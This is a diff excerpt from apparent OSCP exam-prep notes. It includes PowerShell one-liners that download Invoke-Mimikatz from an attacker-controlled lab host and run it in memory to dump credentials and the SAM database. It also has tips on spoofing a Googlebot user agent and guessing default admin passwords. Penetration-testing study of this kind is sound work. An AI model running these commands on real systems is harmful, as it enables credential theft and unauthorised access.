@@ -14,13 +14,8 @@ description: Just some rough notes in preparation for the OSCP.
   * `powershell IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.10.1:8080/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds`&#x20;
   * `powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.119.164:8080/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -Command lsadump::sam`
 * If you are getting the following message `You are not a search engine. Permission denied.` when attempting to browse to robots.txt then set your user agent in Burp to the following:&#x20;
-  *   `User-Agent: Googlebot/2.1 (+http://www.googlebot.com/bot.html)`
-
-      ####
-
-      \
-      \
-
+  * `User-Agent: Googlebot/2.1 (+http://www.googlebot.com/bot.html)`
+* If a login page default password doesn't work then think of what a lazy admin would use (uppercase and lowercase). CeWL can be used here if you're running out of ideas.
 
 ### Helpful Blogs
 
